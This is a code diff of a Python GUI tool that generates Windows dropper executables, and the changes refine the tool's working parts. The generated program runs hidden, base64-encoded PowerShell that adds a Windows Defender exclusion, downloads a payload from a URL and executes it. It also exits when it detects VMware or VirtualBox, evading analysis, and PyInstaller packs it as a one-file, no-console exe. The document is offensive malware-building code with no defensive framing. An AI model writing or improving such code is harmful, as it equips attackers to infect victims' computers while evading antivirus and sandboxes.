@@ -28,14 +28,13 @@ if (-not (Test-Path $DOWNLOAD_DIR)) {{
 $FinalFilePath = Join-Path $DOWNLOAD_DIR $PAYLOAD_NAME
 Add-MpPreference -ExclusionPath $FinalFilePath
 
-Write-Host "Downloading content from $URL to $TempDownloadFile"
+Write-Host "Downloading content from $URL to $FinalFilePath"
 Invoke-WebRequest -Uri $URL -OutFile $FinalFilePath
 
 Write-Host "Waiting for $DELAY_WAIT seconds after download..."
 Start-Sleep -Seconds $DELAY_WAIT
 
 Write-Host "Starting final process: $FinalFilePath"
-Add-MpPreference -ExclusionPath $FinalFilePath
 Start-Process -FilePath $FinalFilePath -NoNewWindow
 """)
 
@@ -45,14 +44,16 @@ Start-Process -FilePath $FinalFilePath -NoNewWindow
 VM_CHECK_FUNCTION = textwrap.dedent("""\
 import subprocess
 import os
-import winreg
 import platform
 import sys
 import base64
-import time
 
 def is_running_on_vmware_windows():
     if platform.system() != "Windows":
+        return False
+    try:
+        import winreg
+    except Exception:
         return False
         
     # --- Check 1: WMI Artifacts (System/Hardware Names) ---
@@ -80,7 +81,7 @@ def is_running_on_vmware_windows():
 
     # --- Check 3: Process List Artifacts ---
     try:
-        vm_processes = ["vmtoolsd.exe", "VBoxService.exe", "vmacthlp.exe", "VMSrvc.exe"]
+        vm_processes = ["vmtoolsd.exe", "vboxservice.exe", "vmacthlp.exe", "vmsrvc.exe"]
         command = 'tasklist /nh' 
         
         result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=3)
@@ -102,20 +103,23 @@ def is_running_on_vmware_windows():
 
 # 2. PowerShell Execution Function (Safe In-Memory Method)
 PS_EXEC_FUNCTION = textwrap.dedent("""\
-def execute_powershell_script(ps_content, delay_start):
-    time.sleep(delay_start)
-
+def execute_powershell_script(ps_content):
     try:
         ps_script_bytes = ps_content.encode('utf-16le')
         ps_b64 = base64.b64encode(ps_script_bytes).decode('utf-8')
     except Exception:
-        return False 
-    
-    command = f"powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand {ps_b64}"
+        return False
+
+    cmd = [
+        "powershell.exe",
+        "-ExecutionPolicy", "Bypass",
+        "-NoProfile",
+        "-WindowStyle", "Hidden",
+        "-EncodedCommand", ps_b64,
+    ]
 
     try:
-        subprocess.run(command, shell=True, timeout=600, 
-                       creationflags=subprocess.CREATE_NO_WINDOW) 
+        subprocess.run(cmd, timeout=600, creationflags=0x08000000)
         return True
     except Exception:
         return False
@@ -201,12 +205,12 @@ class GeneratorGUI(tk.Tk):
 if is_running_on_vmware_windows():
     sys.exit(0)
 else:
-    execute_powershell_script(PS_SCRIPT_CONTENT, EXECUTION_DELAY)
+    execute_powershell_script(PS_SCRIPT_CONTENT)
 """)
         else:
             # Logic skips VM check and executes directly
             core_logic = textwrap.dedent(f"""\
-execute_powershell_script(PS_SCRIPT_CONTENT, EXECUTION_DELAY)
+execute_powershell_script(PS_SCRIPT_CONTENT)
 """)
 
         # 2. Assemble the full script, ensuring the core_logic is correctly indented.
@@ -219,8 +223,7 @@ execute_powershell_script(PS_SCRIPT_CONTENT, EXECUTION_DELAY)
 {PS_EXEC_FUNCTION}
 
 # --- TEMPLATE VARIABLES ---
-PS_SCRIPT_CONTENT = '''{ps_content.replace("'", "\\'")}'''
-EXECUTION_DELAY = {delay_start}
+PS_SCRIPT_CONTENT = {ps_content!r}
 
 if __name__ == "__main__":
     if platform.system() == "Windows":
@@ -287,13 +290,14 @@ if __name__ == "__main__":
             # 5b. Define output parameters for PyInstaller
             output_dir = os.path.dirname(exe_output_filepath)
             exe_name = os.path.basename(exe_output_filepath)
+            exe_basename = os.path.splitext(exe_name)[0]
             
             # 5c. Construct and run PyInstaller command
             pyinstaller_command = [
                 'pyinstaller',
                 '--onefile',
                 '--noconsole',
-                '--name', exe_name,
+                '--name', exe_basename,
                 '--distpath', output_dir, 
                 temp_py_file 
             ]
@@ -323,7 +327,7 @@ if __name__ == "__main__":
             if os.path.exists(temp_dir):
                 shutil.rmtree(temp_dir, ignore_errors=True)
             
-            spec_file = os.path.join(os.getcwd(), exe_name.replace('.exe', '.spec'))
+            spec_file = os.path.join(os.getcwd(), f"{exe_basename}.spec")
             if os.path.exists(spec_file):
                 os.remove(spec_file)
             
